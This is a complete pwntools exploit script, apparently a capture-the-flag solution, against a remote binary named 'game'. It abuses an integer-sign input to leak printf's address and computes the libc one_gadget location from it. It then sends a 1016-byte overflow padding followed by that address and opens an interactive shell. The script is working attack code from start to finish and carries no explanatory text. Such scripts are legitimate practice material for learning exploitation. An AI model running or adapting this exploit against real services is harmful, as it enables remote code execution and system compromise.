from pwn import *
local = False
elf = 'game'

if local:
    context.binary = './'+elf
    r = process("./"+elf)
else:
    ip = "140.114.77.172"
    port = 10111
    r = remote(ip,port)

context.arch = "amd64"

ans = chr(0)
magic = str(-2147483648)
size = str(2147483647)
printf_offset = int("0x64e80",16)
one_gadget_offset = int("0x4f322",16)
name = "0000000000000000"
offset = 'A' * 1016

r.recvline()
r.sendline(ans)
r.recvline()
r.sendline(magic)
r.recvline()
r.recvline()
r.recvuntil(" : ")
printf = r.recvline()

printf = int(printf, 16)
r.recvline()

one_gadget_addr = printf - printf_offset + one_gadget_offset
r.sendline(name)
r.recvline()
r.recvline()
r.sendline(size)
r.recvline()
r.sendline(offset + p64(one_gadget_addr))

r.interactive()
